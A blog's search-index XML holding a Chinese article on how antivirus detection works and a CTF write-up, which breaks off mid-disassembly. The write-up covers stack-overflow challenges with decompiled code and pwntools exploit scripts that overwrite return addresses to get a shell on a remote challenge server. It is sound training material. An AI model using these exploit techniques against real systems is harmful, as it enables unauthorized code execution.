<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>病毒扫描背后的秘密：从特征码到智能防御的技术揭秘</title>
      <link href="2025/03/31/virus_defence/"/>
      <url>2025/03/31/virus_defence/</url>
      
        <content type="html"><![CDATA[<p>在数字世界中，病毒与杀毒软件的对抗从未停歇。要实现精准的病毒查杀，核心依赖于三大技术：<strong>病毒特征码识别</strong>、<strong>行为监控</strong>以及<strong>启发式分析</strong>。本文将解析这些技术的原理与实现方式，揭开病毒扫描背后的原理。</p><hr><h2 id="病毒扫描的核心：特征码检测"><a href="#病毒扫描的核心：特征码检测" class="headerlink" title="病毒扫描的核心：特征码检测"></a>病毒扫描的核心：特征码检测</h2><h3 id="特征码检测的实现过程"><a href="#特征码检测的实现过程" class="headerlink" title="特征码检测的实现过程"></a>特征码检测的实现过程</h3><p><strong>病毒特征码</strong>是从病毒样本中提取的独特二进制代码片段，通常不超过64字节，可视为病毒的“数字指纹”。特征码检测的实现需要经过以下技术流程：</p><ol><li><p><strong>样本采集与预处理</strong><br>通过沙箱捕获、用户上报或蜜罐系统收集病毒样本。例如，安全厂商VirusTotal每天接收超过100万份可疑文件，经人工分析后提取有效特征码。样本需经过脱壳（如UPX、ASPack等常见壳）、解密等预处理，以获取病毒原始代码。</p></li><li><p><strong>代码逆向与特征定位</strong><br>使用逆向工具（如IDA Pro、Ghidra）分析病毒二进制文件，定位核心功能模块（如感染模块、加密函数）。例如，WannaCry病毒的MS17-010漏洞利用代码段会被标记为关键特征。为确保特征码稳定性，通常会选择代码段（.text节）而非数据段（.data节），避免病毒变种修改数据导致失效。</p></li><li><p><strong>复合特征码生成</strong><br>对多态病毒（如Emotet），需提取多段特征码形成逻辑组合。例如，某勒索病毒的特征码可能包括：</p><ul><li>字符串特征：<code>&quot;This file is encrypted by [家族名]&quot;</code>；</li><li>代码特征：特定API调用序列（如<code>CryptEncrypt</code>→<code>DeleteFile</code>）；</li><li>哈希特征：加密函数所在代码节的SHA-256值。</li></ul></li><li><p><strong>特征码优化与验证</strong><br>使用工具（如MyCCL）进行冲突测试：将特征码插入正常文件，验证是否触发误报。通过模糊哈希（ssdeep）技术降低特征码对微小修改的敏感度，提升对抗变种病毒的能力。</p></li></ol><hr><h2 id="行为监控：实时防御的“动态哨兵”"><a href="#行为监控：实时防御的“动态哨兵”" class="headerlink" title="行为监控：实时防御的“动态哨兵”"></a>行为监控：实时防御的“动态哨兵”</h2><h3 id="行为监控的技术原理"><a href="#行为监控的技术原理" class="headerlink" title="行为监控的技术原理"></a>行为监控的技术原理</h3><p>行为监控不依赖静态特征码，而是通过<strong>钩子（Hook）技术</strong>实时监控程序行为，主要关注以下高危操作：</p><ul><li><strong>文件操作</strong>：短时间内加密大量文件（如勒索病毒行为）；</li><li><strong>进程注入</strong>：将代码写入其他进程内存（如DLL注入）；</li><li><strong>注册表篡改</strong>：修改系统启动项或服务配置；</li><li><strong>网络行为</strong>：异常端口扫描或C2服务器通信。</li></ul><h3 id="实现流程示例（以勒索病毒检测为例）"><a href="#实现流程示例（以勒索病毒检测为例）" class="headerlink" title="实现流程示例（以勒索病毒检测为例）"></a>实现流程示例（以勒索病毒检测为例）</h3><ol><li><p><strong>API监控层</strong><br>通过内核级钩子（如Windows的SSDT Hook）监控<code>CreateFile</code>、<code>WriteFile</code>等文件操作API。当某进程连续调用<code>CreateFile</code>打开100个文档文件，立即触发预警。</p></li><li><p><strong>行为关联分析</strong><br>结合上下文判断操作风险：若该进程同时调用<code>CryptGenKey</code>生成加密密钥，并删除卷影副本（通过<code>vssadmin.exe</code>），则判定为勒索病毒，触发实时拦截。</p></li><li><p><strong>沙箱验证机制</strong><br>对可疑进程进行隔离运行（如Cuckoo沙箱），观察其是否释放加密勒索信（如<code>README.txt</code>），最终确认恶意行为。</p></li></ol><hr><h2 id="启发式分析：未知威胁的“逻辑捕手”"><a href="#启发式分析：未知威胁的“逻辑捕手”" class="headerlink" title="启发式分析：未知威胁的“逻辑捕手”"></a>启发式分析：未知威胁的“逻辑捕手”</h2><h3 id="启发式分析的核心机制"><a href="#启发式分析的核心机制" class="headerlink" title="启发式分析的核心机制"></a>启发式分析的核心机制</h3><p>启发式分析通过预定义规则集对程序进行风险评分，主要检测以下可疑模式：</p><ol><li><p><strong>代码结构异常</strong>  </p><ul><li>PE头信息篡改（如入口点指向资源节）；</li><li>节区段熵值过高（可能经过加密或压缩）；</li><li>导入表异常（如仅依赖<code>LoadLibrary</code>和<code>GetProcAddress</code>动态加载API）。</li></ul></li><li><p><strong>行为模式评分</strong><br>构建评分系统（满分100分），例如：</p><ul><li>创建自启动项：+20分；</li><li>尝试关闭杀毒软件进程：+30分；</li><li>无数字签名且评分超过70分：判定为恶意程序。</li></ul></li><li><p><strong>机器学习模型</strong><br>使用随机森林或神经网络模型，输入特征包括：</p><ul><li>API调用序列（如<code>VirtualAlloc</code>→<code>WriteProcessMemory</code>→<code>CreateRemoteThread</code>的典型注入序列）；</li><li>字符串特征（如硬编码IP地址或域名）；</li><li>代码相似度（与已知病毒家族的代码块匹配度）。</li></ul></li></ol><hr><h2 id="病毒库的高效构建与匹配机制"><a href="#病毒库的高效构建与匹配机制" class="headerlink" title="病毒库的高效构建与匹配机制"></a>病毒库的高效构建与匹配机制</h2><p>病毒库的工程化设计直接影响扫描性能。典型方案包括：</p><ul><li><strong>分库存储</strong>：按特征码哈希首字母划分16个子库，减少遍历次数；</li><li><strong>增量更新</strong>：仅同步新增特征码，避免全量下载占用资源；</li><li><strong>并行处理</strong>：多线程同时扫描文件的不同区段，充分利用多核CPU性能。</li></ul><hr><h2 id="技术演进与未来防御趋势"><a href="#技术演进与未来防御趋势" class="headerlink" title="技术演进与未来防御趋势"></a>技术演进与未来防御趋势</h2><p>当前病毒防御面临两大挑战：</p><ol><li><strong>未知病毒检测</strong>：传统特征码仅能应对已知威胁；</li><li><strong>零日攻击防御</strong>：APT攻击常利用未公开漏洞，绕过常规检测。</li></ol><p>未来技术将向以下方向发展：</p><ul><li><strong>AI与机器学习</strong>：通过训练模型识别恶意代码模式，例如分析API调用序列或内存行为异常；</li><li><strong>云安全协同</strong>：实时共享全球病毒特征数据，构建分布式威胁情报网络；</li><li><strong>主动防御系统</strong>：基于程序行为实时拦截可疑操作，而非依赖事后特征匹配。</li></ul><hr><h2 id="用户防护建议"><a href="#用户防护建议" class="headerlink" title="用户防护建议"></a>用户防护建议</h2><ol><li><strong>选择杀毒软件</strong>：优先考虑病毒库更新频率快、资源占用低的工具；</li><li><strong>系统维护</strong>：定期安装安全补丁，避免漏洞被利用；</li><li><strong>安全意识</strong>：谨慎扫描不明来源的二维码或链接，防止钓鱼攻击。</li></ol><hr><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>病毒防御是技术与意识的双重博弈。尽管特征码技术仍是当前主流，但其局限性催生了行为分析、AI预测等新一代解决方案。用户需在依赖技术防护的同时，保持警惕，方能构筑全面的数字安全防线。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CyberSecurity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSCTF_fresh</title>
      <link href="2024/11/10/xsctf_fresh/"/>
      <url>2024/11/10/xsctf_fresh/</url>
      
        <content type="html"><![CDATA[<h2 id="c-master"><a href="#c-master" class="headerlink" title="c_master"></a>c_master</h2><p><code>请使用简单的C语句对程序进行getshell吧！</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Try to write a C getshell program with my code!</span><br><span class="line">read(0,base,0x8);</span><br><span class="line">write(1,base,0x8);</span><br><span class="line">base+&#x3D;8;</span><br><span class="line">base-&#x3D;8;</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *s; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  s = <span class="built_in">malloc</span>(<span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">1024u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try to write a C getshell program with my code!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;read(0,base,0x8);&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;write(1,base,0x8);&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;base+=8;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;base-=8;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;return 0;&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">            __isoc99_scanf(<span class="string">&quot;%128s&quot;</span>, s);</span><br><span class="line">            <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s, <span class="string">&quot;read(0,base,0x8);&quot;</span>) )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">            read(<span class="number">0</span>, &amp;v6[v4], <span class="number">8u</span>LL);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s, <span class="string">&quot;write(1,base,0x8);&quot;</span>) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;output:&quot;</span>);</span><br><span class="line">          write(<span class="number">1</span>, &amp;v6[v4], <span class="number">8u</span>LL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s, <span class="string">&quot;base+=8;&quot;</span>) )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v4 += <span class="number">8</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s, <span class="string">&quot;base-=8;&quot;</span>) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v4 -= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s, <span class="string">&quot;return 0;&quot;</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such code...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据输入确定写入数据的地址，那么可以直接将位置定位到main函数的返回地址，写入程序中提供的backdoor函数<br>需要注意程序开了canary，所以要多往后走一次</p><table><thead><tr><th>Low Address</th><th>…</th><th></th></tr></thead><tbody><tr><td></td><td>local var</td><td>&lt;- rsp</td></tr><tr><td></td><td>canary value</td><td>&lt;- rbp-8</td></tr><tr><td></td><td>old rbp</td><td>&lt;- rbp</td></tr><tr><td></td><td>return address</td><td></td></tr><tr><td></td><td>args</td><td></td></tr><tr><td>High Address</td><td>…</td><td></td></tr></tbody></table><p>坑：直接返回到backdoor函数又不可以，需要返回到实际执行system函数的代码地址</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;43.248.97.213&quot;</span>, <span class="number">30483</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;base+=8;&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&quot;base+=8;&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&quot;base+=8;&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&quot;read(0,base,0x8);&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(p64(<span class="number">0x4012c3</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&quot;return 0;&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;p1e4se_bec0me_4_c_m4ster_x5c7f&#125;</code></p><h2 id="rock-paper-scissors"><a href="#rock-paper-scissors" class="headerlink" title="rock_paper_scissors"></a>rock_paper_scissors</h2><p>欢迎来到石头剪刀布！<br>一共进行三十局，你赢了加一分，输了或平局不得分<br>获得十分就算胜利！<br>输入’石头’、’剪刀’或’布’来进行游戏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">28</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> RandomMove; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> userout; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v3 = time(<span class="number">0L</span>L);</span><br><span class="line">  srand(v3);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_402080);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_4020A0);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_4020E6);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_402108);</span><br><span class="line">  <span class="keyword">while</span> ( v10 &lt;= <span class="number">9</span> &amp;&amp; v9 &lt;= <span class="number">29</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(&amp;byte_402139);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v10 &gt; <span class="number">5</span> )</span><br><span class="line">      gets(v5);</span><br><span class="line">    __isoc99_scanf(&amp;unk_402151, v5);</span><br><span class="line">    userout = stringToMove(v5);</span><br><span class="line">    <span class="keyword">if</span> ( userout == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(&amp;byte_402158);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v10 &gt; <span class="number">8</span> || v10 &lt;= <span class="number">5</span> || (<span class="keyword">int</span>)hard() &lt;= <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v10 == <span class="number">9</span> &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)hell() != <span class="number">666</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">        win(userout, v10);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        RandomMove = getRandomMove();</span><br><span class="line">        <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">        <span class="keyword">if</span> ( RandomMove == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_402037);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( RandomMove &lt;= <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( RandomMove )</span><br><span class="line">            <span class="built_in">puts</span>(&amp;byte_40203E);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">puts</span>(&amp;s2);</span><br><span class="line">        &#125;</span><br><span class="line">        v6 = determineWinner(userout, RandomMove);</span><br><span class="line">        <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_4021A7);</span><br><span class="line">          ++v10;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v6 == <span class="number">-1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_402054);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_402073);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(&amp;byte_402061, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v10);</span><br><span class="line">        ++v9;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">int</span>)hard() &lt;= <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      bewin(userout, v10);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">final</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中final函数就是最终的shell，而gets函数存在漏洞，可以使用栈溢出将当前函数的返回地址覆盖为final函数的返回地址<br>但是传输的payload需要符合一定条件<br>因为程序对输入进行了检查，输入的字符串必须是石头剪刀布的一种<br>这种情况下可以用%00作为payload，即输入石头的编码后加上%00，这样程序在处理字符串时遇到%00就会认为已经到字符串末尾了，而实际的payload会全部传输到内存中</p><blockquote><p>中文在C语言中使用utf-8编码，一个中文字符占用三个字节<br>在构造payload时要注意端序，例如“石头”的utf-8编码是<code>E79FB3E5A4B4</code>但是实际传输时是<code>p64(0xe5b39fe7)+p64(0xb4a4)</code></p></blockquote><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./rock_paper_scissors&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;43.248.97.213&#x27;</span>, <span class="number">30480</span>)</span><br><span class="line"><span class="comment"># print(list(p64(0xe5b39fe7)+p64(0xb4a4)))</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(p64(<span class="number">0xe5b39fe7</span>)+p64(<span class="number">0xb4a4</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x4012db</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;1bab71b8-117f-4dea-a047-340b72101d7b&#125;</code></p><h2 id="toolong"><a href="#toolong" class="headerlink" title="toolong"></a>toolong</h2><p><code>一个字节能解决的shellcode，就不要用两个字节！</code></p><p>程序两次接收用户输入，其中第二次应该输入shellcode，之后程序会将用户输入的shellcode直接执行，但是题目限制了输入shellcode的长度（24）</p><p>题目给的可执行文件反汇编失败，估计是将字符串地址作为函数地址直接调用导致的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">.text:000055A4CE79820E ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:000055A4CE79820E public main</span><br><span class="line">.text:000055A4CE79820E main proc near                          ; DATA XREF: _start+18↑o</span><br><span class="line">.text:000055A4CE79820E</span><br><span class="line">.text:000055A4CE79820E s&#x3D; byte ptr -150h</span><br><span class="line">.text:000055A4CE79820E buf&#x3D; byte ptr -50h</span><br><span class="line">.text:000055A4CE79820E var_8&#x3D; dword ptr -8</span><br><span class="line">.text:000055A4CE79820E var_4&#x3D; dword ptr -4</span><br><span class="line">.text:000055A4CE79820E</span><br><span class="line">.text:000055A4CE79820E ; __unwind &#123; &#x2F;&#x2F; 55A4CE797000</span><br><span class="line">.text:000055A4CE79820E endbr64</span><br><span class="line">.text:000055A4CE798212 push    rbp</span><br><span class="line">.text:000055A4CE798213 mov     rbp, rsp</span><br><span class="line">.text:000055A4CE798216 sub     rsp, 150h</span><br><span class="line">.text:000055A4CE79821D mov     eax, 0</span><br><span class="line">.text:000055A4CE798222 call    init</span><br><span class="line">.text:000055A4CE798227 mov     [rbp+var_8], 1</span><br><span class="line">.text:000055A4CE79822E lea     rax, s                          ; &quot;Welcome to XSCTF&quot;</span><br><span class="line">.text:000055A4CE798235 mov     rdi, rax                        ; s</span><br><span class="line">.text:000055A4CE798238 call    _puts</span><br><span class="line">.text:000055A4CE79823D lea     rax, [rbp+buf]</span><br><span class="line">.text:000055A4CE798241 mov     edx, 81                         ; nbytes</span><br><span class="line">.text:000055A4CE798246 mov     rsi, rax                        ; buf</span><br><span class="line">.text:000055A4CE798249 mov     edi, 0                          ; fd</span><br><span class="line">.text:000055A4CE79824E call    _read</span><br><span class="line">.text:000055A4CE798253 lea     rax, aInputYourMagic            ; &quot;input your magic code:&quot;</span><br><span class="line">.text:000055A4CE79825A mov     rdi, rax                        ; s</span><br><span class="line">.text:000055A4CE79825D call    _puts</span><br><span class="line">.text:000055A4CE798262 lea     rax, [rbp+s]</span><br><span class="line">.text:000055A4CE798269 mov     edx, 256                        ; nbytes</span><br><span class="line">.text:000055A4CE79826E mov     rsi, rax                        ; buf</span><br><span class="line">.text:000055A4CE798271 mov     edi, 0                          ; fd</span><br><span class="line">.text:000055A4CE798276 call    _read</span><br><span class="line">.text:000055A4CE79827B mov     [rbp+var_4], eax</span><br><span class="line">.text:000055A4CE79827E cmp     [rbp+var_4], 0</span><br><span class="line">.text:000055A4CE798282 jg      short loc_55A4CE79828B</span><br><span class="line">.text:000055A4CE798284 mov     eax, 0</span><br><span class="line">.text:000055A4CE798289 jmp     short locret_55A4CE7982DE</span><br><span class="line">.text:000055A4CE79828B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000055A4CE79828B</span><br><span class="line">.text:000055A4CE79828B loc_55A4CE79828B:                       ; 